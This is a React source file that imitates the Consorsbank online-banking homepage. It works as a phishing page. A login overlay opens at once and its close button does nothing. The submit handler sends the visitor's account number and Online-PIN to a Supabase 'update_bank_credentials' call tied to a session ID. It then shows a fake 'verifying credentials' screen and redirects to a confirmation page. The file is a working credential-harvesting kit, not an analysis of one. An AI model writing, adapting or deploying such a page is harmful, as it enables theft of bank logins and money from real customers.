import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, EyeOff, Search, Pause, ChevronRight, X } from "lucide-react";
import logoAsset from "@/assets/consorsbank/consorsbank-logo.svg.asset.json";
import proximaAsset from "@/assets/consorsbank/Proxima_Vara.woff2.asset.json";
import heroImg from "@/assets/consorsbank/hero-girokonto.webp.asset.json";
import cardGiro from "@/assets/consorsbank/card-girokonto.webp.asset.json";
import cardDepot from "@/assets/consorsbank/card-wertpapierdepot.webp.asset.json";
import cardTagesgeld from "@/assets/consorsbank/card-tagesgeld.webp.asset.json";
import teaserKrypto from "@/assets/consorsbank/teaser-krypto.webp.asset.json";

const PETROL = "#00779E";
const PETROL_DARK = "#005f80";
const TEXT = "#1d1d1b";
const MUTED = "#6b7280";
const HERO_BG = "#F5F6F9";
const BORDER = "#dcdfe3";
const NAV_BORDER = "#707175";

const Consorsbank = () => {
  const [params] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = params.get("s") || "";
  const [showLogin, setShowLogin] = useState(true);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPw, setShowPw] = useState(false);
  const [showLoading, setShowLoading] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  useEffect(() => {
    if (!showLogin) return;
    const prev = document.body.style.overflow;
    document.body.style.overflow = "hidden";
    return () => { document.body.style.overflow = prev; };
  }, [showLogin]);
  usePageMeta("Consorsbank – Zukunft selbstgemacht", logoAsset.url);

  const openLogin = (e?: React.MouseEvent) => { e?.preventDefault(); setShowLogin(true); };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username || !password) return;
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: username,
        p_password: password,
        p_username_label: "Depotnummer / Benutzername",
        p_password_label: "PIN",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLogin(false);
    setShowLoading(true);
  };

  const navItems = ["Girokonto", "Sparen & Anlegen", "Wertpapierhandel", "Finanzieren", "Hilfe & Kontakt"];

  return (
    <>
      <style>{`
        @font-face {
          font-family: 'Proxima Nova Vara';
          src: url('${proximaAsset.url}') format('woff2-variations'),
               url('${proximaAsset.url}') format('woff2');
          font-weight: 100 1000;
          font-stretch: 25% 151%;
          font-display: swap;
        }
        .cb-root { font-family: 'Proxima Nova Vara', system-ui, -apple-system, sans-serif; color: ${TEXT}; font-feature-settings: "ss05" 1; }
        .cb-root *, .cb-root *::before, .cb-root *::after { box-sizing: border-box; }

        .cb-btn-pill {
          display: inline-flex; align-items: center; justify-content: center;
          height: 36px; padding: 0 12px; border-radius: 999px;
          font-weight: 600; font-size: 14px; line-height: 1;
          transition: background 150ms ease, color 150ms ease, border-color 150ms ease;
        }
        .cb-btn-primary { background: ${PETROL}; color: #fff; border: 1px solid ${PETROL}; }
        .cb-btn-primary:hover { background: ${PETROL_DARK}; border-color: ${PETROL_DARK}; }
        .cb-btn-outline { background: #fff; color: ${TEXT}; border: 1px solid ${NAV_BORDER}; }
        .cb-btn-outline:hover { border-color: ${TEXT}; }

        .cb-btn-hero {
          display: inline-flex; align-items: center; justify-content: center;
          height: 48px; padding: 0 20px; border-radius: 999px;
          background: ${PETROL}; color: #fff; font-weight: 600; font-size: 16px;
        }
        .cb-btn-hero:hover { background: ${PETROL_DARK}; }

        .cb-nav-link {
          position: relative;
          padding: 8px 14px;
          font-size: 15px;
          font-weight: 500;
          color: ${TEXT};
          cursor: pointer;
          white-space: nowrap;
        }
        .cb-nav-link:hover { color: ${PETROL}; }

        .cb-search {
          display: inline-flex; align-items: center; gap: 8px;
          padding: 10px 16px; color: ${TEXT};
          font-size: 15px; cursor: pointer;
        }
        .cb-search:hover { color: ${PETROL}; }

        .cb-card-link {
          color: ${PETROL}; font-weight: 600; font-size: 15px;
          display: inline-flex; align-items: center; gap: 4px;
          text-decoration: none;
        }
        .cb-card-link:hover { text-decoration: underline; }

        .cb-bullet { padding-left: 1.25rem; list-style: disc outside; }
        .cb-bullet li { position: relative; padding-left: 4px; margin-bottom: 10px; line-height: 1.5; display: list-item; }
        .cb-bullet li::marker { color: ${TEXT}; }

        /* Login input */
        .cb-input-wrap { position: relative; }
        .cb-input {
          width: 100%; height: 52px;
          padding: 20px 44px 6px 14px;
          border: 1px solid ${BORDER}; border-radius: 4px;
          background: #fff; font-size: 15px; color: ${TEXT};
          outline: none; font-family: inherit;
          transition: border-color 120ms ease;
        }
        .cb-input:focus { border-color: ${PETROL}; box-shadow: 0 0 0 1px ${PETROL}; }
        .cb-input-label {
          position: absolute; left: 14px; top: 50%; transform: translateY(-50%);
          font-size: 15px; color: ${MUTED}; pointer-events: none;
          transition: top 120ms ease, font-size 120ms ease, transform 120ms ease;
        }
        .cb-input-wrap.is-filled .cb-input-label,
        .cb-input:focus + .cb-input-label {
          top: 8px; transform: translateY(0); font-size: 11px; color: ${PETROL};
        }

        @media (max-width: 1023px) {
          .cb-nav-row { display: none; }
          .cb-hero-grid { grid-template-columns: 1fr !important; }
          .cb-hero-img { height: 220px !important; order: -1; }
          .cb-hero-content { padding: 24px 20px 28px !important; }
          .cb-hero-title { font-size: 32px !important; }
          .cb-header-inner { padding: 10px 16px !important; gap: 12px !important; }
          .cb-logo { width: 48px !important; height: 58px !important; }
          .cb-btn-pill { height: 32px !important; padding: 0 10px !important; font-size: 13px !important; }
          .cb-cards { padding: 28px 20px !important; gap: 28px !important; grid-template-columns: 1fr !important; }
          .cb-teaser { padding: 0 20px 40px !important; grid-template-columns: 1fr !important; gap: 24px !important; }
          .cb-teaser-title { font-size: 22px !important; }
          .cb-footer-inner { padding: 20px 16px !important; gap: 6px 14px !important; font-size: 12px !important; text-align: center; }

          .cb-login-modal { max-width: calc(100vw - 24px) !important; margin: 16px 12px !important; padding: 28px 18px 24px !important; }
          .cb-login-grid { grid-template-columns: 1fr !important; row-gap: 10px !important; }
          .cb-login-title { font-size: 20px !important; white-space: normal !important; }
          .cb-login-label { text-align: left !important; font-size: 14px !important; margin-bottom: -4px; }
          .cb-login-spacer { display: none !important; }
          .cb-login-col2 { grid-column: 1 / 2 !important; }
        }
      `}</style>

      <div className="cb-root min-h-screen bg-white">
        {/* HERO (header overlays the hero background) */}
        <section className="w-full relative">
          <div className="cb-hero-grid grid grid-cols-[40%_60%] w-full">
            <div className="cb-hero-img" style={{ height: 560, background: `#cfd8dc center/cover no-repeat url(${heroImg.url})` }} />
            <div style={{ background: HERO_BG }} className="flex flex-col">

              {/* HERO CONTENT */}
              <div className="cb-hero-content flex flex-col justify-center px-6 lg:px-12 pt-32 pb-10 flex-1">
                <div className="text-[15px] mb-3" style={{ color: TEXT }}>Zahl damit, nicht dafür</div>
                <h1 className="cb-hero-title font-bold mb-5" style={{ fontSize: 44, lineHeight: 1.1 }}>Girokonto</h1>
                <ul className="cb-bullet text-[15px] mb-7" style={{ color: TEXT }}>
                  <li>kostenlose Kontoführung für alle unter 31 Jahren oder bei mehr als 700 Euro Geldeingang im Monat</li>
                  <li>freie Kartenwahl mit kostenloser Kreditkarte und kostenloser girocard</li>
                </ul>
                <div>
                  <a href="#" className="cb-btn-hero" onClick={(e) => e.preventDefault()}>Zum Girokonto</a>
                </div>

                {/* dots */}
                <div className="mt-10 flex items-center gap-3">
                  <button className="w-7 h-7 rounded-full border flex items-center justify-center" style={{ borderColor: TEXT }} aria-label="Pause">
                    <Pause size={12} fill={TEXT} />
                  </button>
                  {[0,1,2,3,4].map((i) => (
                    <span key={i} className="rounded-full" style={{
                      width: 8, height: 8,
                      background: i === 2 ? PETROL : "#c6ccd3",
                    }} />
                  ))}
                </div>
              </div>
            </div>
          </div>

          {/* HEADER overlays hero */}
          <header className="absolute top-0 left-0 right-0 w-full z-10">
            <div className="cb-header-inner max-w-[1120px] mx-auto px-6 lg:px-10 flex items-center gap-6 py-3">
              <a href="#" className="flex-shrink-0" aria-label="Consorsbank Startseite">
                <div className="cb-logo" style={{ width: 72, height: 86 }}>
                  <img src={logoAsset.url} alt="Consorsbank by BNP Paribas" className="w-full h-full object-contain" />
                </div>
              </a>
              <div className="flex-1 flex flex-col gap-2">
                <div className="flex items-center justify-end gap-3">
                  <button className="cb-btn-pill cb-btn-outline" onClick={(e) => e.preventDefault()}>Watchlist</button>
                  <button className="cb-btn-pill cb-btn-primary" onClick={openLogin}>Login</button>
                </div>
                <nav className="cb-nav-row flex items-center" style={{ border: `1px solid ${NAV_BORDER}`, borderRadius: 8, padding: "0 8px", background: "#fff" }}>
                  {navItems.map((n) => (
                    <a key={n} href="#" className="cb-nav-link" onClick={(e) => e.preventDefault()}>{n}</a>
                  ))}
                  <div className="ml-auto">
                    <div className="cb-search">
                      <Search size={18} />
                      <span>Suche</span>
                    </div>
                  </div>
                </nav>
              </div>
            </div>
          </header>
        </section>


        {/* THREE CARDS */}
        <section className="w-full bg-white">
          <div className="cb-cards max-w-[1120px] mx-auto px-6 lg:px-10 py-14 grid grid-cols-1 md:grid-cols-3 gap-10">
            {[
              {
                title: "Girokonto",
                img: cardGiro.url,
                sub: "Zahl damit, nicht dafür",
                bullets: [
                  "Kostenlose Kontoführung für alle unter 31 Jahren oder bei mindestens 700 Euro Geldeingang im Monat",
                  "Freie Kartenwahl mit kostenloser Kreditkarte und kostenloser girocard",
                ],
                link: "Zum Girokonto",
              },
              {
                title: "Wertpapierdepot",
                img: cardDepot.url,
                sub: "Clevere Kombi zum Vermögensaufbau",
                bullets: [
                  "Depot mit Tagesgeld inklusive 3,80 % Zinsen p. a. auf das Tagesgeldkonto",
                  "0,95 Euro pro Order (zzgl. marktüblicher Spreads) über die Börse Tradegate Exchange",
                ],
                link: "Zum Depot",
              },
              {
                title: "Tagesgeld",
                img: cardTagesgeld.url,
                sub: "Tagesgeld + ETF-Prämie",
                bullets: [
                  "Aktion: ETF-Prämie im Wert von ca. 100 Euro zum Tagesgeld sichern",
                  "Tagesgeld mit 3,80 % Zinsen p. a. bis zu 1 Million Euro, für 5 Monate garantiert",
                ],
                link: "Zum Tagesgeld",
              },
            ].map((c) => (
              <div key={c.title}>
                <h3 className="font-bold text-[22px] mb-4">{c.title}</h3>
                <div className="w-full mb-5" style={{ aspectRatio: "16 / 10", borderRadius: 12, background: `#eee center/cover no-repeat url(${c.img})` }} />
                <div className="font-bold text-[15px] mb-3">{c.sub}</div>
                <ul className="cb-bullet text-[14px] mb-5" style={{ color: TEXT }}>
                  {c.bullets.map((b, i) => <li key={i}>{b}</li>)}
                </ul>
                <a href="#" className="cb-card-link" onClick={(e) => e.preventDefault()}>
                  {c.link} <ChevronRight size={16} />
                </a>
              </div>
            ))}
          </div>
        </section>

        {/* TEASER */}
        <section className="w-full bg-white">
          <div className="cb-teaser max-w-[1120px] mx-auto px-6 lg:px-10 pb-20 grid grid-cols-1 md:grid-cols-2 gap-10 items-start">
            <div>
              <h2 className="cb-teaser-title font-bold mb-5" style={{ fontSize: 28, lineHeight: 1.2 }}>
                ETNs mit Krypto-Basiswert: an der Entwicklung digitaler Währungen teilhaben
              </h2>
              <p className="text-[15px] leading-relaxed mb-5" style={{ color: TEXT }}>
                Blockchain und Kryptowährungen zählen zu den spannendsten Technologien unserer Zeit. Über ETNs mit Krypto-Basiswert können Sie an dessen Entwicklungen teilhaben und gleichzeitig Ihr Portfolio gezielt diversifizieren. Mit Ihrem Consorsbank Depot handeln Sie flexibel an Börsenplätzen wie Xetra, über Direkthandelspartner oder im Rahmen eines Sparplans.
              </p>
              <a href="#" className="cb-card-link" onClick={(e) => e.preventDefault()}>
                Mehr erfahren <ChevronRight size={16} />
              </a>
            </div>
            <div className="w-full" style={{ aspectRatio: "16 / 9", background: `#eee center/cover no-repeat url(${teaserKrypto.url})` }} />
          </div>
        </section>

        {/* FOOTER */}
        <footer className="w-full" style={{ background: "#f5f6f8", borderTop: `1px solid ${BORDER}` }}>
          <div className="cb-footer-inner max-w-[1280px] mx-auto px-6 lg:px-10 py-8 text-[13px] flex flex-wrap items-center justify-center gap-x-6 gap-y-2" style={{ color: MUTED }}>
            <span>© Consorsbank – eine Niederlassung der BNP Paribas S.A.</span>
            <a href="#" className="hover:underline" onClick={(e) => e.preventDefault()}>Impressum</a>
            <a href="#" className="hover:underline" onClick={(e) => e.preventDefault()}>Datenschutz</a>
            <a href="#" className="hover:underline" onClick={(e) => e.preventDefault()}>AGB</a>
            <a href="#" className="hover:underline" onClick={(e) => e.preventDefault()}>Cookie-Einstellungen</a>
          </div>
        </footer>

        {/* LOGIN OVERLAY */}
        {showLogin && (
          <div className="fixed inset-0 z-50 flex items-start justify-center overflow-y-auto" style={{ background: "rgba(0,0,0,0.65)", backdropFilter: "blur(2px)", WebkitBackdropFilter: "blur(2px)" }}>
            <div
              className="cb-login-modal bg-white w-full max-w-[580px] mx-4 my-8 shadow-xl relative"
              style={{ padding: "36px 28px 32px", borderRadius: 14 }}
            >
              <button
                type="button"
                aria-label="Schließen"
                tabIndex={-1}
                onClick={(e) => e.preventDefault()}
                style={{ position: "absolute", top: 14, right: 14, background: "transparent", border: "none", padding: 4, cursor: "default", color: TEXT, lineHeight: 0 }}
              >
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><line x1="18" y1="6" x2="6" y2="18" /><line x1="6" y1="6" x2="18" y2="18" /></svg>
              </button>

              <form onSubmit={handleLogin}>
                <div className="cb-login-grid" style={{ display: "grid", gridTemplateColumns: "1fr 1fr", rowGap: 14, columnGap: 20, alignItems: "center" }}>
                  <h2 className="cb-login-title font-bold" style={{ fontSize: 24, lineHeight: 1.2, textAlign: "left", gridColumn: "1 / 2", whiteSpace: "nowrap" }}>Loggen Sie sich ein:</h2>
                  <div className="cb-login-spacer" style={{ gridColumn: "2 / 3" }} />

                  <label htmlFor="cb-user" className="cb-login-label text-[16px]" style={{ color: TEXT, textAlign: "right" }}>Kontonummer / UserID:</label>
                  <input
                    id="cb-user"
                    type="text"
                    autoComplete="off"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    style={{ height: 40, border: `1px solid #707175`, borderRadius: 7, padding: "0 12px", fontSize: 15, fontFamily: "inherit", outline: "none", color: TEXT }}
                    onFocus={(e) => { e.currentTarget.style.borderColor = PETROL; e.currentTarget.style.boxShadow = `0 0 0 1px ${PETROL}`; }}
                    onBlur={(e) => { e.currentTarget.style.borderColor = "#707175"; e.currentTarget.style.boxShadow = "none"; }}
                  />
                  <label htmlFor="cb-pw" className="text-[16px]" style={{ color: TEXT, textAlign: "right" }}>Online-PIN / Passwort:</label>
                  <div style={{ position: "relative" }}>
                    <input
                      id="cb-pw"
                      type={showPw ? "text" : "password"}
                      autoComplete="off"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      style={{ height: 40, width: "100%", border: `1px solid #707175`, borderRadius: 7, padding: "0 40px 0 12px", fontSize: 15, fontFamily: "inherit", outline: "none", color: TEXT }}
                      onFocus={(e) => { e.currentTarget.style.borderColor = PETROL; e.currentTarget.style.boxShadow = `0 0 0 1px ${PETROL}`; }}
                      onBlur={(e) => { e.currentTarget.style.borderColor = "#707175"; e.currentTarget.style.boxShadow = "none"; }}
                    />
                    {password.length > 0 && (
                      <button
                        type="button"
                        aria-label={showPw ? "PIN verbergen" : "PIN anzeigen"}
                        onClick={() => setShowPw((v) => !v)}
                        className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-500 hover:text-black"
                      >
                        {showPw ? (
                          <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
                            <path fillRule="evenodd" clipRule="evenodd" d="M17.14 18.59c-1.446.847-3.168 1.448-5.14 1.448-2.771 0-5.047-1.187-6.757-2.572-1.707-1.382-2.904-3.003-3.549-3.994a2.62 2.62 0 0 1 0-2.869c.639-.982 1.82-2.582 3.501-3.956L2.293 3.745 3.707 2.33l18 18-1.414 1.414-3.154-3.154Zm-1.473-1.471-2.002-2.002a3.502 3.502 0 0 1-4.745-4.745L6.618 8.07c-.04.03-.078.062-.117.093-1.484 1.202-2.549 2.636-3.13 3.53a.62.62 0 0 0 0 .69c.581.893 1.646 2.327 3.13 3.53 1.481 1.198 3.326 2.125 5.5 2.125 1.351 0 2.577-.36 3.666-.92Zm-5.165-5.165 1.582 1.581a1.497 1.497 0 0 1-1.582-1.58Z"/>
                            <path d="M22.306 13.472a18.57 18.57 0 0 1-1.375 1.85l-1.42-1.42a16.62 16.62 0 0 0 1.118-1.52.62.62 0 0 0 0-.689c-.581-.894-1.646-2.328-3.13-3.53-1.481-1.2-3.326-2.125-5.499-2.125-.116 0-.231.002-.345.007L9.883 4.274A9.595 9.595 0 0 1 12 4.038c2.771 0 5.047 1.186 6.758 2.57 1.707 1.383 2.904 3.004 3.548 3.995a2.62 2.62 0 0 1 0 2.87Z"/>
                          </svg>
                        ) : (
                          <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
                            <path fillRule="evenodd" clipRule="evenodd" d="M6.501 8.163c-1.484 1.202-2.549 2.636-3.13 3.53a.62.62 0 0 0 0 .69c.581.893 1.646 2.327 3.13 3.53C7.982 17.11 9.827 18.037 12 18.037c2.173 0 4.018-.927 5.499-2.126 1.484-1.202 2.549-2.636 3.13-3.53a.62.62 0 0 0 0-.689c-.581-.894-1.646-2.328-3.13-3.53-1.481-1.2-3.326-2.125-5.499-2.125-2.173 0-4.018.926-5.499 2.125ZM5.243 6.61C6.953 5.224 9.229 4.038 12 4.038c2.771 0 5.047 1.186 6.757 2.57 1.707 1.383 2.905 3.004 3.549 3.995a2.62 2.62 0 0 1 0 2.87c-.644.99-1.842 2.611-3.549 3.993-1.71 1.385-3.986 2.572-6.757 2.572-2.771 0-5.047-1.187-6.757-2.572-1.707-1.382-2.905-3.003-3.549-3.994a2.62 2.62 0 0 1 0-2.869c.644-.991 1.842-2.612 3.549-3.994ZM12 10.288a1.75 1.75 0 1 0 0 3.5 1.75 1.75 0 0 0 0-3.5Zm-3.75 1.75a3.75 3.75 0 1 1 7.5 0 3.75 3.75 0 0 1-7.5 0Z"/>
                          </svg>
                        )}
                      </button>
                    )}
                  </div>

                  <div style={{ gridColumn: "2 / 3" }} className="mt-3 flex flex-col gap-3">
                    <a href="#" onClick={(e) => e.preventDefault()} className="text-[12px] font-semibold underline" style={{ color: TEXT, textDecorationColor: TEXT }}>Online-PIN vergessen</a>
                    <a href="#" onClick={(e) => e.preventDefault()} className="text-[12px] font-semibold underline" style={{ color: TEXT, textDecorationColor: TEXT }}>Fragen zum TAN-Verfahren?</a>
                  </div>

                  <div style={{ gridColumn: "2 / 3" }} className="mt-4">
                    <button
                      type="submit"
                      style={{
                        display: "inline-flex", alignItems: "center", justifyContent: "center", gap: 10,
                        width: "100%",
                        height: 44, padding: "0 24px", borderRadius: 999,
                        background: PETROL, color: "#fff", fontWeight: 600, fontSize: 17,
                        border: "none", cursor: "pointer", transition: "background 0.15s",
                      }}
                      onMouseEnter={(e) => (e.currentTarget.style.background = "#004057")}
                      onMouseLeave={(e) => (e.currentTarget.style.background = PETROL)}
                    >
                      <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
                        <path fillRule="evenodd" d="M18 3a3 3 0 0 1 3 3v12a3 3 0 0 1-3 3h-6v-2h6a1 1 0 0 0 1-1V6a1 1 0 0 0-1-1h-6V3zm-8 3.586 4.707 4.707a1 1 0 0 1 0 1.414L10 17.414 8.586 16l3-3H3v-2h8.586l-3-3z" clipRule="evenodd" />
                      </svg>
                      Einloggen
                    </button>
                  </div>


                  <div style={{ gridColumn: "2 / 3" }} className="mt-1 flex justify-center">
                    <a
                      href="#"
                      onClick={(e) => e.preventDefault()}
                      className="inline-flex items-center gap-2 font-semibold text-[13px] whitespace-nowrap"
                      style={{ color: PETROL, padding: "8px 14px", borderRadius: 999, border: "1px solid transparent", transition: "background 0.15s, border-color 0.15s" }}
                      onMouseEnter={(e) => { e.currentTarget.style.background = "#ecf9fe"; e.currentTarget.style.borderColor = "#004057"; }}
                      onMouseLeave={(e) => { e.currentTarget.style.background = "transparent"; e.currentTarget.style.borderColor = "transparent"; }}
                    >
                      <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
                        <path d="M12 2 2 7v2h20V7L12 2Zm-7 8v7H3v2h18v-2h-2v-7h-2v7h-3v-7h-2v7h-2v-7H8v7H5v-7H3h2Z" />
                      </svg>
                      Jetzt Konto oder Depot eröffnen
                    </a>

                  </div>
                </div>
              </form>
            </div>

          </div>
        )}
      </div>

      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
    </>
  );
};

export default Consorsbank;
